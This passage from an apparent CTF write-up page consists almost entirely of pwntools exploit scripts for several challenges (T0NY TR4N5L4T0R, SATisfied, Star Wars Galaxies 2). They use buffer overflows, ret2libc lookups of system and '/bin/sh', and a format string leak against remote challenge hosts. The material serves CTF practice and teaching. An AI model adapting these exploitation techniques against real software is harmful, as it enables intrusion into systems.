<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="n">ru</span><span class="p">(</span><span class="s">'The Dark Side resides at:'</span><span class="p">)</span>
<span class="n">leak_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'leak_addr '</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
<span class="n">pay</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">)</span><span class="o">*</span><span class="mh">0x40</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'Jedi Mind tricks dont work on me &gt;&gt;&gt; </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>

<span class="c1"># mark, learn brop
</span></code></pre></div></div>

<h2 id="t0ny-tr4n5l4t0r">T0NY TR4N5L4T0R</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./leet'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">26008</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x0804921D</span>
<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x22</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'e'</span><span class="o">*</span><span class="mi">4</span> 
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x7</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'lleett'</span> 
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mi">2</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'c'</span>

<span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="n">itr</span><span class="p">()</span>

</code></pre></div></div>

<h2 id="satisfied">SATisfied</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./satisfy'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">34720</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">ru</span><span class="p">(</span><span class="s">'Here is a random token'</span><span class="p">)</span>
<span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'num '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>

<span class="n">v3</span> <span class="o">=</span> <span class="mi">31337</span> <span class="o">^</span> <span class="n">num</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'v3 '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">v3</span><span class="p">))</span>
<span class="n">res</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">^</span> <span class="n">num</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'res '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">v3</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4013AA</span><span class="p">)</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'What is your response &gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
</code></pre></div></div>

<h2 id="star-wars-galaxies-2">Star Wars Galaxies 2</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./starwars'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">34916</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">cla</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'Enter your player name: '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'Enter your player id number: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'Select your player class: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">cla</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">play</span><span class="p">():</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>

<span class="c1"># offset = 8
</span><span class="n">pay</span> <span class="o">=</span> <span class="s">'---%25$s----%25$p'</span> 
<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">ru</span><span class="p">(</span><span class="s">'----'</span><span class="p">)</span>
<span class="n">boss_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
